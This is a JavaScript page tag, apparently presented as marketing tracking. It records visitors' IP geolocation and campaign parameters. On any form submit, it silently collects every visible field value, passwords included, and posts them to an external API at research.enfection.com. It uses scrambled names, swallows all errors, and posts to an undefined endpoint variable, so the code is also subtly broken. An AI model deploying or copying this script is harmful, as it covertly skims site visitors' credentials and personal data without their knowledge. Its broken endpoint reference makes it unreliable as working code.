try {
    var u4s_i2d = '{{ unique-id }}';
    if (localStorage.getItem("17c6dd3f7e5046798ecc1d51645f2db9") == null) {
        function getIP() {
            var request = new XMLHttpRequest();
            request.open('GET', 'https://ipinfo.io/json', true);
            request.onload = function () {
                if (this.status >= 200 && this.status < 400) {
                    var data = JSON.parse(this.response);
                    data = JSON.stringify(data);
                    localStorage.setItem('17c6dd3f7e5046798ecc1d51645f2db9', data);
                } else {
                    localStorage.setItem('17c6dd3f7e5046798ecc1d51645f2db9', '');
                }
            };
            request.onerror = function () {};
            request.send();
        }
        getIP();
    }

    var form = document.querySelector("form");
    function check_user() {
        check_prev_entry = localStorage.getItem('4m6o7n9s8teecrc1');
        if (check_prev_entry == null) {
            var session_id = Id_gen();
            localStorage.setItem('4m6o7n9s8teecrc1', session_id)
        } else {
        }
    }

    function getParameter(theParameter) {
        var url = window.location.href;
        var param = url.substr(1).split('?');
        var temporaryVariable = param[1];
        try {
            var params = temporaryVariable.split('&');
            if (params != 'undefined') {
                for (var i = 0; i < params.length; i++) {
                    var p = params[i].split('=');
                    if (p[0] == theParameter) {
                        return decodeURIComponent(p[1]);
                    }
                }
            }
        } catch {
        }
        return false;
    }

    var url_src = getParameter('utm_source'), url_mdm = getParameter('utm_medium'), url_cpn = getParameter('utm_campaign'), url_gclid = getParameter('gclid'), url_fbclid = getParameter('fbclid'), base = "https://research.enfection.com/api/";
    var unrillpaakrsahmaeters = new Object();
    unrillpaakrsahmaeters["source"] = (url_src !== false)? url_src : '';
    unrillpaakrsahmaeters["medium"] = (url_mdm !== false)? url_mdm : '';
    unrillpaakrsahmaeters["campaign"] = (url_cpn !== false)?url_cpn : '';
    unrillpaakrsahmaeters["gclid"] = (url_gclid !== false)?url_gclid : '';
    var stringObj = JSON.stringify(unrillpaakrsahmaeters);
    localStorage.setItem('utm_data', stringObj);

    var serializeArray = function (form) {
        if (form.id.length === 0) {
            var temp_id = "this form has no id";
        } else {
            var temp_id = form.id;
        }
        var serialized = [];
        serialized.push({
            form : { form_id: temp_id },
        });
        try {
            var temp = (Object.keys(form.elements).length);
        } catch {}
        var formdata = [];
        for (var i = 0; i < temp; i++) {
            var field = form.elements[i];
            try {
                if (field.type !== 'hidden' && field.type !== 'submit' && field.type !== 'button') {
                    formdata.push({
                        name: field.name,
                        value: field.value,
                        type: field.type
                    });
                }
            } catch {
            }
        }
        serialized.push({
            form_data : formdata,
        });
        return serialized;
    }

    window.onsubmit = function (e) {
        if (e.isTrusted) {
            var currentObj = e.target;
            var result = serializeArray(currentObj);
            var stringObj2 = JSON.stringify(result);
            localStorage.setItem('4f6o7r9m8deactca1', stringObj2);
            sendNukesAgain();
        } else {
        }
    };

    function checkDeviceType() {
        var isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        if (isMobile) {
            var device = "Mobile";
            return device;
        } else {
            var device = "PC";
            return device;
        }
    }

    window.onload = function () {
        if(window.performance && performance.navigation.type != 1 || !window.performance ){
            var device_type = checkDeviceType();
            var urlAr = [];
            urlAr.push({
                url: window.location.href,
                device_type: device_type
            });
            var stringObj3 = JSON.stringify(urlAr);
            localStorage.setItem('url', stringObj3);
            sendNukes();
        }
    }

    check_user();

    function sendNukes() {
        var sessId = localStorage.getItem('4m6o7n9s8teecrc1');
        var utm_data = localStorage.getItem('utm_data');
        var url_data = localStorage.getItem('url');
        var ip_data = localStorage.getItem('17c6dd3f7e5046798ecc1d51645f2db9');
        var dataAr = [];
        dataAr.push({
            utm_data: utm_data,
            url_data: url_data,
            ip_data: ip_data
        });
        var temp = JSON.stringify(dataAr);
        var xhr = new XMLHttpRequest();
        xhr.open("POST", ebda2s0e4cab90da4547831952b792925770 + 'getdata', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('client-id', u4s_i2d);
        xhr.setRequestHeader('session-id', sessId);

        xhr.send(temp);
    }

    function sendNukesAgain() {
        var sessId = localStorage.getItem('4m6o7n9s8teecrc1');
        var formdata = localStorage.getItem('4f6o7r9m8deactca1');
        var dataAr = [];

        dataAr.push({
            formdata: formdata,
            form_url: window.location.href,
        });
        var temp = JSON.stringify(dataAr);
        var xhr = new XMLHttpRequest();
        xhr.open("POST",  ebda2s0e4cab90da4547831952b792925770 + 'getformdata', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.setRequestHeader('client-id', u4s_i2d);
        xhr.setRequestHeader('session-id', sessId);
        xhr.send(temp);
        localStorage.removeItem('4f6o7r9m8deactca1');
    }

    function Id_gen() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0,
                v = c == 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }
} catch (err) {}
